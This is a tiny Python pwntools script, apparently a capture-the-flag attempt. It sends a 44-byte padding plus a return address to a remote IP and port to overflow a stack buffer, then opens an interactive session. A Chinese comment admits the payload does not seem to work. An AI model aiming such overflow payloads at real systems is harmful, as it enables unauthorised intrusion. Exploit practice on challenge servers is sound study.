#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"a" * 44 + p64(0x10084D))
r.interactive()


# 从标准输入中读取字符，目前从反汇编看来是44个，但是在后面加上地址也没什么效果
# 不详（
